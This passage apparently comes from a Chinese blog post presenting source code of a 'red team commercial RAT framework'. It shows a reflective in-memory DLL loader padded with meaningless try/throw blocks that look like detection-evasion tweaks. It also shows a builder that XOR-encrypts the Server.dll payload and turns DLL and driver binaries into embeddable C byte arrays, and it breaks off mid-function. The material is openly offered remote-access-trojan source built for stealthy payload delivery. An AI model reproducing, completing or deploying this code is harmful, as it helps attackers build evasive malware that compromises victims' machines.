+	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
+	if (directory-&gt;Size &gt; 0)
+	{
+
+			//	return 0;//203
+		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory-&gt;VirtualAddress);
+		for (; !pIsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) &amp;&amp; importDesc-&gt;Name; importDesc++)
+		{
+
+				//		return 0;//204
+			DWORD *thunkRef, *funcRef;
+			HMODULE handle = LoadLibraryA((LPCSTR)(codeBase + importDesc-&gt;Name));
+			if (handle == INVALID_HANDLE_VALUE)
+			{
+//				OutputDebugString(_T("Can't load library"));
+				result = 0;
+				break;
+			}
+	//		return 0;//205
+
+			module-&gt;modules = (HMODULE *)myrealloc(module-&gt;modules, (module-&gt;numModules+1)*(sizeof(HMODULE)));
+			if (module-&gt;modules == NULL)
+			{
+				result = 0;
+				break;
+			}
+			//	return 0;//206
+
+			module-&gt;modules[module-&gt;numModules++] = handle;
+			if (importDesc-&gt;OriginalFirstThunk)
+			{
+				thunkRef = (DWORD *)(codeBase + importDesc-&gt;OriginalFirstThunk);
+
+				funcRef = (DWORD *)(codeBase + importDesc-&gt;FirstThunk);
+			} else 
+			{
+				// no hint table
+				thunkRef = (DWORD *)(codeBase + importDesc-&gt;FirstThunk);
+				funcRef = (DWORD *)(codeBase + importDesc-&gt;FirstThunk);
+			}
+
+	//	return 0;//207
+			for (; *thunkRef; thunkRef++, funcRef++)
+			{
+				if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
+					*funcRef = (DWORD)GetProcAddress(handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
+				else {
+
+					try
+					{
+						if(1+1==2)throw 66;
+					}
+					catch (...)
+					{
+						PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
+						*funcRef = (DWORD)GetProcAddress(handle, (LPCSTR)&amp;thunkData-&gt;Name);
+					}
+
+				}
+	//		return 0;//208
+
+				try
+				{
+					if(1+1==2)throw 66;
+				}
+				catch (...)
+				{
+					if (*funcRef == 0)
+					{
+
+						try
+						{
+							if(1+1==2)throw 66;
+						}
+						catch (...)
+						{
+							result = 0;
+						}
+
+						break;
+					}
+				}
+
+		//	return 0;//209
+			}
+			//return 0;//210
+
+			if (!result)
+				break;
+
+			//	return 0;//211
+		}
+	}
+//	return 0;//212
+	return result;
+}
+
+HMEMORYMODULE MemoryLoadLibrary(const void *data)
+{
+
+
+//	return 0;//7
+
+
+
+	//	return 0;//8
+
+	PMEMORYMODULE result;
+	PIMAGE_DOS_HEADER dos_header;
+	PIMAGE_NT_HEADERS old_header;
+	unsigned char *code, *headers;
+	DWORD locationDelta;
+	DllEntryProc DllEntry;
+	BOOL successfull;
+
+	dos_header = (PIMAGE_DOS_HEADER)data;
+	if (dos_header-&gt;e_magic != IMAGE_DOS_SIGNATURE)
+	{
+//		OutputDebugString(_T("Not a valid executable file.\n"));
+		return NULL;
+	}
+
+	old_header = (PIMAGE_NT_HEADERS)&amp;((const unsigned char *)(data))[dos_header-&gt;e_lfanew];
+	if (old_header-&gt;Signature != IMAGE_NT_SIGNATURE)
+	{
+//		OutputDebugString(_T("No PE header found.\n"));
+		return NULL;
+	}
+
+
+
+
+
+	// reserve memory for image of library
+	code = (unsigned char *)VirtualAlloc((LPVOID)(old_header-&gt;OptionalHeader.ImageBase),
+		old_header-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
+
+
+    if (code == NULL)
+        // try to allocate memory at arbitrary position
+        code = (unsigned char *)VirtualAlloc(NULL, old_header-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
+
+	if (code == NULL)
+	{
+//		OutputDebugString(_T("Can't reserve memory"));
+		return NULL;
+	}
+
+	result = (PMEMORYMODULE)HeapAlloc(GetProcessHeap(), 0, sizeof(MEMORYMODULE));
+	result-&gt;codeBase = code;
+	result-&gt;numModules = 0;
+	result-&gt;modules = NULL;
+	result-&gt;initialized = 0;
+
+//	return 0;//14
+
+	// XXX: is it correct to commit the complete memory region at once?
+    //      calling DllEntry raises an exception if we don't...
+
+try
+{
+if(1+1==2)throw 63;
+}
+catch (...)
+{
+VirtualAlloc(code,
+		old_header-&gt;OptionalHeader.SizeOfImage,
+		MEM_COMMIT,
+		PAGE_READWRITE);
+}
+
+
+	// commit memory for headers
+	headers = (unsigned char *)VirtualAlloc(code,
+		old_header-&gt;OptionalHeader.SizeOfHeaders,
+		MEM_COMMIT,
+		PAGE_READWRITE);
+	//	return 0;//16
+
+	// copy PE header to code
+	memcpy(headers, dos_header, dos_header-&gt;e_lfanew + old_header-&gt;OptionalHeader.SizeOfHeaders);
+	result-&gt;headers = (PIMAGE_NT_HEADERS)&amp;((const unsigned char *)(headers))[dos_header-&gt;e_lfanew];
+
+	// update position
+	result-&gt;headers-&gt;OptionalHeader.ImageBase = (DWORD)code;
+
+	// copy sections from DLL file block to new memory location
+	CopySections((const unsigned char *)data, old_header, result);
+
+	// adjust base address of imported data
+	locationDelta = (DWORD)(code - old_header-&gt;OptionalHeader.ImageBase);
+	if (locationDelta != 0)
+		PerformBaseRelocation(result, locationDelta);
+
+	// load required dlls and adjust function table of imports
+	if (!BuildImportTable(result));
+		//goto error;
+	//	return 0;//20
+
+	// mark memory pages depending on section headers and release
+	// sections that are marked as "discardable"
+	FinalizeSections(result);
+
+	// get entry point of loaded library
+	if (result-&gt;headers-&gt;OptionalHeader.AddressOfEntryPoint != 0)
+	{
+		// 
+
+
+//	return 0;//223
+		// notify library about attaching to process
+
+		try
+		{
+			if(1+1==2)throw 31;
+		}
+		catch (...)
+		{
+			DllEntry = (DllEntryProc)(code + result-&gt;headers-&gt;OptionalHeader.AddressOfEntryPoint);
+
+		}
+
+
+	try
+	{
+		if(1+1==2)throw 31;
+	}
+	catch (...)
+	{
+		successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);
+		// 
+	}
+
+		result-&gt;initialized = 1;
+	//return 0;//22
+
+	}
+
+
+	return (HMEMORYMODULE)result;
+
+//error:
+	// cleanup
+// 
+// 
+
+ 	MemoryFreeLibrary(result);
+	return NULL;
+}
+
+FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
+{
+
+
+	unsigned char *codeBase = ((PMEMORYMODULE)module)-&gt;codeBase;
+	int idx=-1;
+	DWORD i, *nameRef;
+	WORD *ordinal;
+	PIMAGE_EXPORT_DIRECTORY exports;
+	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);
+	if (directory-&gt;Size == 0)
+		// no export table found
+		return NULL;
+
+	exports = (PIMAGE_EXPORT_DIRECTORY)(codeBase + directory-&gt;VirtualAddress);
+	if (exports-&gt;NumberOfNames == 0 || exports-&gt;NumberOfFunctions == 0)
+		// DLL doesn't export anything
+		return NULL;
+
+
+
+
+	// search function name in list of exported names
+	nameRef = (DWORD *)(codeBase + exports-&gt;AddressOfNames);
+	ordinal = (WORD *)(codeBase + exports-&gt;AddressOfNameOrdinals);
+
+	for (i=0; i&lt;exports-&gt;NumberOfNames; i++, nameRef++, ordinal++)
+
+		if (strcmpiA(name, (const char *)(codeBase + *nameRef)) == 0)
+		{
+			idx = *ordinal;
+			break;
+		}
+
+	if (idx == -1)
+		// exported symbol not found
+		return NULL;
+
+
+	if ((DWORD)idx &gt; exports-&gt;NumberOfFunctions)
+		// name &lt;-&gt; ordinal number don't match
+		return NULL;
+
+// 	// AddressOfFunctions contains the RVAs to the "real" functions
+ 	return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports-&gt;AddressOfFunctions + (idx*4)));
+}
+
+void MemoryFreeLibrary(HMEMORYMODULE mod)
+{
+
+
+	int i;
+	PMEMORYMODULE module = (PMEMORYMODULE)mod;
+
+//return ;//llllllllllllllllllllllllllllll
+ 	if (module != NULL)
+ 	{
+		if (module-&gt;initialized != 0)
+		{
+			// notify library about detaching from process
+			DllEntryProc DllEntry = (DllEntryProc)(module-&gt;codeBase + module-&gt;headers-&gt;OptionalHeader.AddressOfEntryPoint);
+			(*DllEntry)((HINSTANCE)module-&gt;codeBase, DLL_PROCESS_DETACH, 0);
+			module-&gt;initialized = 0;
+		}
+
+
+		if (module-&gt;modules != NULL)
+		{
+			// free previously opened libraries
+			for (i=0; i&lt;module-&gt;numModules; i++)
+				if (module-&gt;modules[i] != INVALID_HANDLE_VALUE)
+					FreeLibrary(module-&gt;modules[i]);
+
+			myfree(module-&gt;modules);
+		}
+
+		if (module-&gt;codeBase != NULL)
+			// release memory of library
+			VirtualFree(module-&gt;codeBase, 0, MEM_RELEASE);
+
+		typedef HANDLE
+			(WINAPI
+			*GetProcessHeapT)(
+			VOID 
+			);
+
+GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetProcessHeap");
+			HeapFree(GetProcessHeap(), 0, module);
+
+	}
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="红队商业版RAT框架源码结构（三）"><a href="#红队商业版RAT框架源码结构（三）" class="headerlink" title="红队商业版RAT框架源码结构（三）"></a>红队商业版RAT框架源码结构（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651025450099/fa4de52030e84ad3940e4b4f070c056f.png" alt="image.png"></p>
+<h5 id="核心源码部分（加密shellcode）"><a href="#核心源码部分（加密shellcode）" class="headerlink" title="核心源码部分（加密shellcode）"></a>核心源码部分（加密shellcode）</h5><pre class="line-numbers language-none"><code class="language-none">// ShellCode.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include &lt;stdlib.h&gt;
+#include &lt;Windows.h&gt;
+
+
+
+void EncrypMain(char *Buff, int Size, char *AddTable) //加密/解密服务端文件(Server.dll)
+{
+
+	for (int i=0, j=0; i&lt;Size; i++)
+	{
+		Buff[i] ^= AddTable[j++] % 17 + 55 + 77 + 77;
+
+		if (i % 3 == 0)
+			j = 0;
+	}
+}
+
+
+
+BOOL SaveDr32(char *FileName) //生成DriverCode32(DriverCode32.h)
+{
+	HANDLE hSysFile;
+	DWORD dwSysSize;
+	LPVOID pSysBuff;
+	DWORD BytesRead;
+	LPVOID pOutBuff;
+	HANDLE hOutFile;
+	DWORD BytesWritten;
+
+	hSysFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hSysFile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	dwSysSize  = GetFileSize(hSysFile, 0);
+
+	pSysBuff = VirtualAlloc(NULL, dwSysSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pSysBuff == NULL)
+	{
+		CloseHandle(hSysFile);
+		return FALSE;
+	}
+	if (!ReadFile(hSysFile, pSysBuff, dwSysSize, &amp;BytesRead, NULL))
+	{
+		VirtualFree(pSysBuff, 0, MEM_RELEASE);
+		CloseHandle(hSysFile);
+		return FALSE;
+	}
+	CloseHandle(hSysFile);
+
+	pOutBuff = VirtualAlloc(NULL, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pOutBuff == NULL)
+	{
+		VirtualFree(pSysBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+
+	char *pDllChar = (char *)pSysBuff;
+	char *pOutChar = (char *)pOutBuff;
+	for (DWORD i = 0; i &lt; dwSysSize; i++)
+	{
+		if (i == dwSysSize - 1)
+		{
+			sprintf(pOutChar, "0x%0.2X", (unsigned char)*pDllChar++);
+			pOutChar += 4;
+		}
+		else
+		{
+			sprintf(pOutChar, "0x%0.2X,", (unsigned char)*pDllChar++);
+			pOutChar += 5;
+		}
+
+		if (i % 32 == 31 || i == dwSysSize - 1)
+		{
+			*pOutChar++ = '\r';
+			*pOutChar++ = '\n';
+		}
+	}
+	VirtualFree(pSysBuff, 0, MEM_RELEASE);
+
+	char OutData1[] = "/*\r\n DriverCode32 By Anonymity\r\n My QQ ????????\r\n"
+		" 直接include此单元，使用 DriverCode32SaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";
+	char OutData2[] = "#ifndef _HEX_DRIVERCODE32_\r\n#define _HEX_DRIVERCODE32_\r\n#include &lt;windows.h&gt;\r\n\r\n";
+	char OutData3[64] = {0};
+	sprintf(OutData3, "const g_DriverCode32FileSize = %d;\r\n", dwSysSize);
+	char OutData4[] = "unsigned char g_DriverCode32FileBuff[] = {\r\n";
+	char OutData5[] = "};\r\n\r\n";
+	char OutData6[] = "/*\r\nbool DriverCode32SaveFile(char *FileName)\r\n{\r\n\tbool Result = false;"
+		"\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n"
+		"\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n"
+		"\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n"
+		"\tif (WriteFile(hFile, g_DriverCode32FileBuff, g_DriverCode32FileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n"
+		"\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";
+
+	hOutFile = CreateFile("DriverCode32.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);
+	if (hOutFile == INVALID_HANDLE_VALUE)
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, pOutBuff, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	VirtualFree(pOutBuff, 0, MEM_RELEASE);
+	CloseHandle(hOutFile);
+	return TRUE;
+}
+
+BOOL SaveDr64(char *FileName) //生成DriverCode64(DriverCode64.h)
+{
+	HANDLE hSysFile;
+	DWORD dwSysSize;
+	LPVOID pSysBuff;
+	DWORD BytesRead;
+	LPVOID pOutBuff;
+	HANDLE hOutFile;
+	DWORD BytesWritten;
+
+	hSysFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hSysFile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	dwSysSize  = GetFileSize(hSysFile, 0);
+
+	pSysBuff = VirtualAlloc(NULL, dwSysSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pSysBuff == NULL)
+	{
+		CloseHandle(hSysFile);
+		return FALSE;
+	}
+	if (!ReadFile(hSysFile, pSysBuff, dwSysSize, &amp;BytesRead, NULL))
+	{
+		VirtualFree(pSysBuff, 0, MEM_RELEASE);
+		CloseHandle(hSysFile);
+		return FALSE;
+	}
+	CloseHandle(hSysFile);
+
+	pOutBuff = VirtualAlloc(NULL, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pOutBuff == NULL)
+	{
+		VirtualFree(pSysBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+
+	char *pDllChar = (char *)pSysBuff;
+	char *pOutChar = (char *)pOutBuff;
+	for (DWORD i = 0; i &lt; dwSysSize; i++)
+	{
+		if (i == dwSysSize - 1)
+		{
+			sprintf(pOutChar, "0x%0.2X", (unsigned char)*pDllChar++);
+			pOutChar += 4;
+		}
+		else
+		{
+			sprintf(pOutChar, "0x%0.2X,", (unsigned char)*pDllChar++);
+			pOutChar += 5;
+		}
+
+		if (i % 32 == 31 || i == dwSysSize - 1)
+		{
+			*pOutChar++ = '\r';
+			*pOutChar++ = '\n';
+		}
+	}
+	VirtualFree(pSysBuff, 0, MEM_RELEASE);
+
+	char OutData1[] = "/*\r\n DriverCode64 By Anonymity\r\n My QQ ????????\r\n"
+		" 直接include此单元，使用 DriverCode64SaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";
+	char OutData2[] = "#ifndef _HEX_DRIVERCODE64_\r\n#define _HEX_DRIVERCODE64_\r\n#include &lt;windows.h&gt;\r\n\r\n";
+	char OutData3[64] = {0};
+	sprintf(OutData3, "const g_DriverCode64FileSize = %d;\r\n", dwSysSize);
+	char OutData4[] = "unsigned char g_DriverCode64FileBuff[] = {\r\n";
+	char OutData5[] = "};\r\n\r\n";
+	char OutData6[] = "/*\r\nbool DriverCode64SaveFile(char *FileName)\r\n{\r\n\tbool Result = false;"
+		"\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n"
+		"\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n"
+		"\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n"
+		"\tif (WriteFile(hFile, g_DriverCode64FileBuff, g_DriverCode64FileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n"
+		"\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";
+
+	hOutFile = CreateFile("DriverCode64.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);
+	if (hOutFile == INVALID_HANDLE_VALUE)
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, pOutBuff, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	VirtualFree(pOutBuff, 0, MEM_RELEASE);
+	CloseHandle(hOutFile);
+	return TRUE;
+}
+
+BOOL SaveMain(char *FileName, char *AddTable) //生成加密后的文件(Server.dll)
+{
+	HANDLE hDllFile;
+	DWORD dwDllSize;
+	LPVOID pDllBuff;
+	DWORD BytesRead;
+	DWORD BytesWritten;
+
+	hDllFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDllFile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	dwDllSize  = GetFileSize(hDllFile, 0);
+
+	pDllBuff = VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pDllBuff == NULL)
+	{
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	if (!ReadFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesRead, NULL))
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	CloseHandle(hDllFile);
+
+	EncrypMain((char *)pDllBuff, dwDllSize, AddTable);
+	hDllFile = CreateFile(FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
+	if (hDllFile == INVALID_HANDLE_VALUE)
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	if (!WriteFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	VirtualFree(pDllBuff, 0, MEM_RELEASE);
+	CloseHandle(hDllFile);
+	return TRUE;
+}
+
+BOOL SaveCode(char *FileName) //生成ShellCode(ShellCode.h)
+{
+	HANDLE hDllFile;
+	DWORD dwDllSize;
+	LPVOID pDllBuff;
+	DWORD BytesRead;
+	LPVOID pOutBuff;
+	HANDLE hOutFile;
+	DWORD BytesWritten;
+
+	hDllFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDllFile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	dwDllSize  = GetFileSize(hDllFile, 0);
+
+	pDllBuff = VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pDllBuff == NULL)
+	{
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	if (!ReadFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesRead, NULL))
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	CloseHandle(hDllFile);
+
+	pOutBuff = VirtualAlloc(NULL, (dwDllSize*5-1)+((dwDllSize+32-1)/32*2), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pOutBuff == NULL)
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+
+	char *pDllChar = (char *)pDllBuff;
+	char *pOutChar = (char *)pOutBuff;
+	for (DWORD i = 0; i &lt; dwDllSize; i++)
+	{
+		if (i == dwDllSize - 1)
+		{
+			sprintf(pOutChar, "0x%0.2X", (unsigned char)*pDllChar++);
+			pOutChar += 4;
+		}
+		else
+		{
+			sprintf(pOutChar, "0x%0.2X,", (unsigned char)*pDllChar++);
+			pOutChar += 5;
+		}
+
